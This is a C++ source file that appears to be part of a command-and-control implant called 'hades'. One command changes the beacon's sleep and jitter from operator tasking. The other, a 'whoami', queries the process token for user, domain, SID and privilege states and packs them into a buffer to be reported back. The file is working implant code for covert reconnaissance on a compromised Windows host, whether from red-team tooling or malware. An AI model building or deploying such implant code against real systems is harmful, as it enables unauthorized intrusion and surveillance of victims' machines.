#include "cmds.hpp"
#include "../hades/config.hpp"


void commanders::do_reconfig() {

	g_ByteMgr->BeginTask();

	hades->config->Sleep = g_ByteMgr->Read4();
	hades->config->Jitter = g_ByteMgr->Read4();

	g_ByteMgr->EndOk(RECONFIG_DONE);
}


void commanders::do_whoami() {
	PTOKEN_PRIVILEGES TokenPrivs = NULL;
	PCHAR buf = NULL;
	HANDLE hToken = NULL;
	PTOKEN_USER TokenUsr = NULL;
	LPSTR SidStr = NULL;
	SID_NAME_USE sidType;
	NTSTATUS Stat;

	CHAR NameBuf[256] = { 0 };
	CHAR DomainBuf[256] = { 0 };
	DWORD NameLen = 256;
	DWORD DomainLen = 256;
	DWORD TokenUsrSize = 0;
	DWORD TokenPrivSize = 0;
	DWORD SidLen = 0;



	g_ByteMgr->BeginTask();

	Stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
		goto CLEANUP;
	}

	hades->NtApis.NtQueryInformationToken(hToken, TokenUser, NULL, 0, &TokenUsrSize);
	TokenUsr = AllocMemory<TOKEN_USER>(TokenUsrSize);
	if (!TokenUsr) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenUser, TokenUsr, TokenUsrSize, &TokenUsrSize);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
		goto CLEANUP;
	}


	if (!hades->WinApis.ConvertSidToStringSidA(TokenUsr->User.Sid, &SidStr)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	if (!hades->WinApis.LookupAccountSidA(NULL, TokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &TokenPrivSize);
	TokenPrivs = AllocMemory<TOKEN_PRIVILEGES>(TokenPrivSize);
	if (!TokenPrivs) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, TokenPrivs, TokenPrivSize, &TokenPrivSize);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
		goto CLEANUP;
	}

	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_TYPE_GETPRIVS);
	g_ByteMgr->Write4(NameLen);
	g_ByteMgr->WriteString((PBYTE)NameBuf, NameLen);
	g_ByteMgr->Write4(DomainLen);
	g_ByteMgr->WriteString((PBYTE)DomainBuf, DomainLen);
	SidLen = (DWORD)strlen(SidStr);
	g_ByteMgr->Write4(SidLen);
	g_ByteMgr->WriteString((PBYTE)SidStr, SidLen);

	for (DWORD i = 0; i < TokenPrivs->PrivilegeCount; i++) {
		LUID_AND_ATTRIBUTES Privs = TokenPrivs->Privileges[i];
		CHAR PrivName[256] = { 0 };
		DWORD PrivNameLen = sizeof(PrivName);
		DWORD PrivStatus = 0;
		if (!hades->WinApis.LookupPrivilegeNameA(NULL, &Privs.Luid, PrivName, &PrivNameLen)) {
			continue;
		}
		if (Privs.Attributes & SE_PRIVILEGE_REMOVED) PrivStatus = PrivRemoved;
		else if (Privs.Attributes & SE_PRIVILEGE_ENABLED) PrivStatus = PrivEnabled;
		else if (Privs.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) PrivStatus = PrivEnabledByDefault;
		else PrivStatus = PrivDisabled;

		g_ByteMgr->Write4(PrivNameLen);
		g_ByteMgr->WriteString((PBYTE)PrivName, PrivNameLen);
		g_ByteMgr->Write4(PrivStatus);
	}

	g_ByteMgr->Write4(END_SIG);

CLEANUP:
	if (TokenPrivs) { HeapFree(GetProcessHeap(), 0, TokenPrivs); }
	if (TokenUsr) { HeapFree(GetProcessHeap(), 0, TokenUsr); }
	if (SidStr) { LocalFree(SidStr); }
	if (hToken) { hades->WinApis.CloseHandle(hToken); }

}



